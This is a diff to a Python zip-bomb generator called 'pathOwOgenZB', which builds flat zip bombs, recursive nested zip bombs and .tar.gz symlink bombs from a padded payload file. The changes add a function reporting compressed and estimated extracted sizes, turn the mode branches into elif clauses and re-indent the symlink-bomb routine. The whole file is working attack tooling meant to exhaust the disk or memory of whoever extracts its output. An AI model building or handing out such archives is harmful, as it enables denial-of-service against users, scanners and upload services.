@@ -10,6 +10,18 @@ from pathlib import Path
 print("Welcome to pathOwOgenZB by Arco!")
 print("Current working directory:", os.getcwd())
 
+def print_final_size(file_path, extracted_mb=None):
+    if os.path.exists(file_path):
+        size_bytes = os.path.getsize(file_path)
+        size_gb = size_bytes / (1024 ** 3)
+        print(f"\n📦 Final compressed size: {size_gb:.2f} GB ({size_bytes:,} bytes)")
+    else:
+        print(f"[!] File not found: {file_path}")
+
+    if extracted_mb is not None:
+        extracted_gb = extracted_mb / 1024
+        print(f"💥 Estimated extracted size: {extracted_gb:.2f} GB ({extracted_mb:,} MB)")
+
 # Zip mode selection
 while True:
     zip_mode = input("Choose mode: (1) Flat Zip Bomb, (2) Recursive Zip Bomb, (3) .tar.gz Bomb: ")
@@ -61,6 +73,8 @@ if zip_mode == "1":
             print()
             print(f"Added {i + 1} files total")
         print(f"PathOwOgenZB Zip created: {zip_name} with {copies} files.")
+        extracted_size_mb = size_mb * copies
+        print_final_size(zip_name, extracted_size_mb)
 
     create_payload()
     zipper()
@@ -68,7 +82,7 @@ if zip_mode == "1":
     print("Removed the payload file")
 
 # Recursive mode
-if zip_mode == "2":
+elif zip_mode == "2":
     while True:
         zip_name = input("Final recursive zip bomb name (must end in .zip!)? ")
         if zip_name.endswith(".zip"):
@@ -99,6 +113,8 @@ if zip_mode == "2":
         
         os.rename(current_zip, zip_name)
         print(f"\nRecursive OwOgen Zip Bomb created {zip_name} with {levels} nested layers.")
+        extracted_size_mb = size_mb * (2 ** levels)
+        print_final_size(zip_name, extracted_size_mb)
         os.remove(payload_name)
         print("Removed the payload file")
 
@@ -108,8 +124,7 @@ if zip_mode == "2":
     recursive_zip()
 
 # UNIX bomb style
-else:
-
+elif zip_mode == "3":
     tar_name = input("Final archive name (must end in .tar.gz): ")
     if not tar_name.endswith(".tar.gz"):
         print("Invalid extension. Appending '.tar.gz'")
@@ -125,22 +140,24 @@ else:
         with open(payload_name, "w") as f:
             f.write(payload_contents * 1024 * 1024 * size_mb)
         print(f"Payload created: {payload_name} ({size_mb}MB)")
-
-def create_tar_symlink_bomb(payload_path):
-    for i in range(copies):
-        link_name = Path(temp_dir) / f"{user_file_name}{i}.txt"
-        try:
-            os.symlink(payload_path, link_name)
-        except Exception as e:
-            print(f"[!] Failed to create symlink {link_name}: {e}")
-            continue
-        if i % 1000 == 0:
-            print(f"Created {i} symlinks...")
+        
+    def create_tar_symlink_bomb(payload_path):
+        for i in range(copies):
+            link_name = Path(temp_dir) / f"{user_file_name}{i}.txt"
+            try:
+                os.symlink(payload_path, link_name)
+            except Exception as e:
+                print(f"[!] Failed to create symlink {link_name}: {e}")
+                continue
+            if i % 1000 == 0:
+                print(f"Created {i} symlinks...")
 
     with tarfile.open(tar_name, "w:gz") as tar:
         tar.add(temp_dir, arcname=".")
 
     print(f"\nTAR.GZ Bomb created: {tar_name}")
+    extracted_size_mb = size_mb * copies
+    print_final_size(tar_name, extracted_size_mb)
     shutil.rmtree(temp_dir)
     os.remove(payload_path)
 
